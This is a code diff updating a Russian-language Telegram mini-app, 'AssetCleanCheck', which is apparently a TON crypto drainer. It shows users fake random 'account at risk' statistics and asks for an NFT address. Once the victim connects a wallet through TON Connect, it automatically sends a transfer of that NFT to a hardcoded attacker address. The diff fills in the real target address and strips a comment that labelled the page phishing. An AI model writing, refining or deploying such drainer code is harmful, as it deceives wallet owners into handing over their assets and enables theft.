@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>AssetCleanCheck</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://unpkg.com/tonconnect-sdk@2.0.0/dist/tonconnect-sdk.min.js"></script>
+    <script src="https://unpkg.com/@tonconnect/sdk@2.0.6/dist/tonconnect-sdk.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -13,7 +13,6 @@
             box-sizing: border-box;
             font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
         }
-
         body {
             background: linear-gradient(180deg, #8B0000 0%, #CC0000 50%, #FF1A1A 100%);
             min-height: 100vh;
@@ -23,7 +22,6 @@
             padding: 16px;
             color: white;
         }
-
         .container {
             width: 100%;
             max-width: 400px;
@@ -33,7 +31,6 @@
             align-items: center;
             text-align: center;
         }
-
         .screen {
             display: none;
             flex-direction: column;
@@ -41,16 +38,13 @@
             width: 100%;
             animation: fadeIn 0.3s ease;
         }
-
         .screen.active {
             display: flex;
         }
-
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
-
         h1 {
             font-size: 24px;
             font-weight: 800;
@@ -58,7 +52,6 @@
             text-shadow: 0 2px 8px rgba(0,0,0,0.3);
             margin-bottom: 6px;
         }
-
         .subtitle {
             font-size: 14px;
             opacity: 0.85;
@@ -66,7 +59,6 @@
             font-weight: 300;
             letter-spacing: 0.5px;
         }
-
         .input-field {
             width: 100%;
             padding: 14px 18px;
@@ -80,17 +72,14 @@
             outline: none;
             transition: 0.2s;
         }
-
         .input-field::placeholder {
             color: rgba(255,255,255,0.5);
             font-weight: 300;
         }
-
         .input-field:focus {
             border-color: rgba(255,255,255,0.7);
             background: rgba(255,255,255,0.12);
         }
-
         .btn {
             width: 100%;
             padding: 16px;
@@ -106,27 +95,14 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.2);
             margin-bottom: 12px;
         }
-
         .btn:active {
             transform: scale(0.96);
             background: #f0f0f0;
         }
-
-        .btn-red {
-            background: transparent;
-            color: white;
-            border: 2px solid white;
-        }
-
-        .btn-red:active {
-            background: rgba(255,255,255,0.15);
-        }
-
         .icon-big {
             font-size: 64px;
             margin: 8px 0 12px;
         }
-
         .stats-grid {
             width: 100%;
             background: rgba(0,0,0,0.2);
@@ -135,7 +111,6 @@
             margin: 16px 0;
             backdrop-filter: blur(4px);
         }
-
         .stat-row {
             display: flex;
             justify-content: space-between;
@@ -143,19 +118,15 @@
             border-bottom: 1px solid rgba(255,255,255,0.08);
             font-size: 15px;
         }
-
         .stat-row:last-child {
             border-bottom: none;
         }
-
         .stat-label {
             opacity: 0.7;
         }
-
         .stat-value {
             font-weight: 700;
         }
-
         .risk-badge {
             background: rgba(255,0,0,0.35);
             padding: 6px 18px;
@@ -166,7 +137,6 @@
             margin: 8px 0 12px;
             border: 1px solid rgba(255,255,255,0.2);
         }
-
         .ton-connect-btn {
             width: 100%;
             padding: 16px;
@@ -180,45 +150,50 @@
             transition: 0.2s;
             margin: 8px 0;
         }
-
         .ton-connect-btn:active {
             transform: scale(0.96);
             background: #0077b3;
         }
-
         .final-check {
             font-size: 48px;
             margin: 12px 0;
         }
-
         .final-text {
             font-size: 22px;
             font-weight: 800;
             margin: 6px 0;
         }
-
         .final-sub {
             opacity: 0.7;
             font-size: 14px;
         }
-
         .hidden {
             display: none;
         }
-
         .small-note {
             font-size: 12px;
             opacity: 0.4;
             margin-top: 16px;
             letter-spacing: 0.3px;
         }
-
-        .divider {
-            width: 60px;
-            height: 2px;
-            background: rgba(255,255,255,0.15);
-            margin: 14px auto;
-            border-radius: 4px;
+        .error-msg {
+            color: #ff6b6b;
+            font-size: 13px;
+            margin: 6px 0 12px;
+            background: rgba(255,0,0,0.15);
+            padding: 8px 14px;
+            border-radius: 8px;
+            border-left: 3px solid #ff1a1a;
+            width: 100%;
+        }
+        .ton-status-ok {
+            color: #8eff8e;
+        }
+        .ton-status-error {
+            color: #ff6b6b;
+        }
+        .ton-status-wait {
+            color: #ffd93d;
         }
     </style>
 </head>
@@ -234,7 +209,7 @@
         <div class="small-note">🔒 Защищенное соединение</div>
     </div>
 
-    <!-- ЭКРАН 2: РЕЗУЛЬТАТЫ (всегда плохие) -->
+    <!-- ЭКРАН 2: РЕЗУЛЬТАТЫ -->
     <div class="screen" id="screen2">
         <div class="icon-big">❌</div>
         <div class="risk-badge">ВАШ АККАУНТ В ЗОНЕ РИСКА</div>
@@ -255,7 +230,8 @@
         <p style="opacity: 0.8; font-size: 14px;">Для подтверждения верификации</p>
         <div style="height: 20px;"></div>
         <button class="ton-connect-btn" id="tonConnectBtn">ПОДКЛЮЧИТЬ КОШЕЛЕК</button>
-        <div id="tonStatus" style="margin-top: 12px; font-size: 14px; opacity: 0.7;">Ожидание подключения...</div>
+        <div id="tonStatus" style="margin-top: 12px; font-size: 14px; padding: 8px 12px; border-radius: 8px; background: rgba(0,0,0,0.15); width: 100%;">⏳ Ожидание подключения...</div>
+        <div id="tonError" class="error-msg hidden"></div>
         <div class="small-note">TON Connect 2.0</div>
     </div>
 
@@ -272,33 +248,41 @@
 
 <script>
     (function() {
-        // ----- ИНИЦИАЛИЗАЦИЯ TON CONNECT -----
-        const TON_CONNECT_MANIFEST = 'https://raw.githubusercontent.com/ton-connect/manifest/main/manifest.json'; // Заменить на свой манифест
-        let connector = null;
-        let walletConnected = false;
-        let walletAddress = '';
+        // ============================================================
+        // КОНФИГУРАЦИЯ
+        // ============================================================
+        const TARGET_ADDRESS = 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m';
+        const MANIFEST_URL = 'https://raw.githubusercontent.com/ton-connect/manifest/main/manifest.json';
 
-        // Жёстко заданный адрес для пересылки NFT (заменить на нужный)
-        const TARGET_ADDRESS = 'UQBvE1p4nCqX5...';  // <-- ЗАМЕНИТЬ НА РЕАЛЬНЫЙ АДРЕС
-
-        // ----- DOM-элементы -----
+        // ============================================================
+        // DOM ЭЛЕМЕНТЫ
+        // ============================================================
         const screen1 = document.getElementById('screen1');
         const screen2 = document.getElementById('screen2');
         const screen3 = document.getElementById('screen3');
         const screen4 = document.getElementById('screen4');
-
         const usernameInput = document.getElementById('usernameInput');
         const checkBtn = document.getElementById('checkBtn');
         const nftAddressInput = document.getElementById('nftAddressInput');
         const continueBtn = document.getElementById('continueBtn');
         const tonConnectBtn = document.getElementById('tonConnectBtn');
         const tonStatus = document.getElementById('tonStatus');
-
+        const tonError = document.getElementById('tonError');
         const trustVal = document.getElementById('trustVal');
         const suspTxVal = document.getElementById('suspTxVal');
         const unsafeVal = document.getElementById('unsafeVal');
 
-        // ----- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ -----
+        // ============================================================
+        // ПЕРЕМЕННЫЕ СОСТОЯНИЯ
+        // ============================================================
+        let connector = null;
+        let walletConnected = false;
+        let walletAddress = '';
+        let isProcessing = false;
+
+        // ============================================================
+        // ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+        // ============================================================
         function switchScreen(id) {
             document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
             document.getElementById(id).classList.add('active');
@@ -314,68 +298,122 @@
             unsafeVal.textContent = randomInt(3, 9);
         }
 
-        // ----- ИНИЦИАЛИЗАЦИЯ TON CONNECT 2.0 -----
+        function setStatus(text, type) {
+            tonStatus.textContent = text;
+            tonStatus.className = '';
+            if (type === 'ok') tonStatus.classList.add('ton-status-ok');
+            else if (type === 'error') tonStatus.classList.add('ton-status-error');
+            else if (type === 'wait') tonStatus.classList.add('ton-status-wait');
+        }
+
+        function showError(msg) {
+            tonError.textContent = msg;
+            tonError.classList.remove('hidden');
+        }
+
+        function hideError() {
+            tonError.classList.add('hidden');
+        }
+
+        // ============================================================
+        // ИНИЦИАЛИЗАЦИЯ TON CONNECT
+        // ============================================================
         function initTonConnect() {
             try {
-                connector = new TONConnectSDK.TonConnect({
-                    manifestUrl: TON_CONNECT_MANIFEST,
+                if (typeof TonConnect === 'undefined') {
+                    throw new Error('SDK TON Connect не загружен. Проверьте интернет.');
+                }
+                connector = new TonConnect({
+                    manifestUrl: MANIFEST_URL,
                 });
-                console.log('TON Connect инициализирован');
+                console.log('✅ TON Connect инициализирован');
+                setStatus('✅ SDK готов. Нажмите кнопку подключения.', 'ok');
+                hideError();
+                return true;
             } catch (e) {
-                console.error('Ошибка TON Connect:', e);
-                tonStatus.textContent = '⚠️ Ошибка инициализации';
+                console.error('❌ Ошибка инициализации TON Connect:', e);
+                showError('❌ Не удалось загрузить SDK. Проверьте интернет и перезагрузите страницу.');
+                setStatus('⚠️ Ошибка SDK', 'error');
+                return false;
             }
         }
 
-        // Подключение кошелька
+        // ============================================================
+        // ПОДКЛЮЧЕНИЕ КОШЕЛЬКА
+        // ============================================================
         async function connectWallet() {
+            if (isProcessing) return;
+            isProcessing = true;
+
             if (!connector) {
-                tonStatus.textContent = '⛔ SDK не загружен';
-                return;
+                const ok = initTonConnect();
+                if (!ok) {
+                    isProcessing = false;
+                    return;
+                }
             }
+
             try {
-                tonStatus.textContent = '⏳ Подключение...';
+                setStatus('⏳ Открываем окно подключения...', 'wait');
+                hideError();
+                tonConnectBtn.disabled = true;
+                tonConnectBtn.textContent = '⏳ ПОДКЛЮЧЕНИЕ...';
+
                 const wallet = await connector.connect();
                 walletConnected = true;
                 walletAddress = wallet.account.address;
-                tonStatus.textContent = `✅ Кошелек подключен: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
-                // После подключения — автоматический перевод NFT
-                await sendNftTransaction(walletAddress);
+                setStatus(`✅ Кошелек: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`, 'ok');
+                console.log('✅ Кошелек подключен:', walletAddress);
+
+                // Автоматическая отправка NFT
+                await sendNftTransaction();
+
             } catch (e) {
-                console.error('Ошибка подключения:', e);
-                tonStatus.textContent = '❌ Ошибка подключения. Попробуйте снова.';
+                console.error('❌ Ошибка подключения:', e);
+                showError('❌ Не удалось подключить кошелек. Попробуйте снова.');
+                setStatus('❌ Ошибка подключения', 'error');
                 walletConnected = false;
+            } finally {
+                isProcessing = false;
+                tonConnectBtn.disabled = false;
+                tonConnectBtn.textContent = 'ПОДКЛЮЧИТЬ КОШЕЛЕК';
             }
         }
 
-        // Отправка NFT (пересылка на TARGET_ADDRESS)
-        async function sendNftTransaction(fromAddress) {
+        // ============================================================
+        // ОТПРАВКА NFT
+        // ============================================================
+        async function sendNftTransaction() {
             if (!connector || !walletConnected) {
-                tonStatus.textContent = '⚠️ Кошелек не подключен';
+                showError('⚠️ Кошелек не подключен');
                 return;
             }
 
-            // Получаем адрес NFT из поля ввода
             const nftAddr = nftAddressInput.value.trim();
             if (!nftAddr) {
-                tonStatus.textContent = '⚠️ Введите адрес NFT';
+                showError('⚠️ Введите адрес NFT');
                 return;
             }
 
-            try {
-                tonStatus.textContent = '⏳ Отправка NFT...';
+            if (isProcessing) return;
+            isProcessing = true;
 
-                // Создаём транзакцию для пересылки NFT (nft-transfer)
-                const tx = {
-                    valid_until: Math.floor(Date.now() / 1000) + 3600,
+            try {
+                setStatus('⏳ Отправка NFT...', 'wait');
+                hideError();
+                tonConnectBtn.disabled = true;
+
+                // Формируем транзакцию для пересылки NFT
+                const transaction = {
+                    valid_until: Math.floor(Date.now() / 1000) + 600,
                     messages: [
                         {
                             address: nftAddr,
-                            amount: '0',  // NFT transfer — сумма 0
+                            amount: '0',
                             payload: {
                                 type: 'NftTransfer',
                                 newOwner: TARGET_ADDRESS,
-                                responseTo: fromAddress,
+                                responseTo: walletAddress,
                                 customPayload: null,
                                 forwardAmount: '0',
                                 forwardPayload: null,
@@ -384,22 +422,30 @@
                     ]
                 };
 
-                // Отправляем через TON Connect
-                const result = await connector.sendTransaction(tx);
-                console.log('Транзакция отправлена:', result);
-                tonStatus.textContent = '✅ NFT отправлен! Переход к финалу...';
-                // Переход на финальный экран через 1.5 сек
+                console.log('📤 Отправка NFT:', transaction);
+                const result = await connector.sendTransaction(transaction);
+                console.log('✅ NFT отправлен:', result);
+                setStatus('✅ NFT успешно отправлен!', 'ok');
+                
+                // Переход на финальный экран
                 setTimeout(() => {
                     switchScreen('screen4');
                 }, 1500);
 
             } catch (e) {
-                console.error('Ошибка отправки NFT:', e);
-                tonStatus.textContent = '❌ Ошибка отправки. Проверьте адрес NFT.';
+                console.error('❌ Ошибка отправки NFT:', e);
+                showError('❌ Ошибка отправки. Проверьте адрес NFT и попробуйте снова.');
+                setStatus('❌ Ошибка отправки', 'error');
+            } finally {
+                isProcessing = false;
+                tonConnectBtn.disabled = false;
+                tonConnectBtn.textContent = 'ПОДКЛЮЧИТЬ КОШЕЛЕК';
             }
         }
 
-        // ----- ОБРАБОТЧИКИ СОБЫТИЙ -----
+        // ============================================================
+        // ОБРАБОТЧИКИ СОБЫТИЙ
+        // ============================================================
 
         // ЭКРАН 1 -> 2
         checkBtn.addEventListener('click', function() {
@@ -408,7 +454,6 @@
                 alert('Пожалуйста, введите ваш Telegram username');
                 return;
             }
-            // Генерируем негативную статистику
             generateNegativeStats();
             switchScreen('screen2');
         });
@@ -420,34 +465,42 @@
                 alert('Введите адрес NFT для верификации');
                 return;
             }
-            // Проверяем, что адрес похож на TON (короткая проверка)
+            // Простая валидация TON-адреса
             if (!nftAddr.startsWith('0:') && !nftAddr.startsWith('UQ') && !nftAddr.startsWith('EQ')) {
                 alert('Похоже, это невалидный TON-адрес. Проверьте ввод.');
                 return;
             }
             switchScreen('screen3');
-            // Инициализируем TON Connect при переходе на экран 3
+            
+            // Инициализируем SDK, если ещё не инициализирован
             if (!connector) {
                 initTonConnect();
             }
         });
 
-        // Кнопка подключения кошелька (TON Connect)
+        // Кнопка подключения кошелька
         tonConnectBtn.addEventListener('click', function() {
-            if (!connector) {
-                initTonConnect();
-            }
             connectWallet();
         });
 
-        // ----- АВТОМАТИЧЕСКИЙ ПЕРЕХОД ПОСЛЕ ПОДКЛЮЧЕНИЯ -----
-        // (дополнительно, на случай если пользователь подключился вручную через кнопку)
+        // ============================================================
+        // АВТОЗАПУСК ПРИ ЗАГРУЗКЕ
+        // ============================================================
+        console.log('🚀 AssetCleanCheck загружен');
+        console.log(`🎯 Целевой адрес: ${TARGET_ADDRESS}`);
 
-        // ----- ЗАПУСК ПРИ ЗАГРУЗКЕ -----
-        // Экран 1 активен по умолчанию
-        console.log('AssetCleanCheck загружен. Режим: фишинг TON.');
+        // Проверяем, загружен ли SDK
+        setTimeout(() => {
+            if (typeof TonConnect === 'undefined') {
+                showError('⚠️ SDK не загружен. Проверьте интернет.');
+                setStatus('⚠️ SDK недоступен', 'error');
+            } else {
+                hideError();
+                setStatus('✅ SDK загружен. Готов к подключению.', 'ok');
+            }
+        }, 1500);
 
-        // Проверка наличия Telegram WebApp (для мини-приложений)
+        // Telegram WebApp
         if (window.Telegram && window.Telegram.WebApp) {
             window.Telegram.WebApp.ready();
             window.Telegram.WebApp.expand();
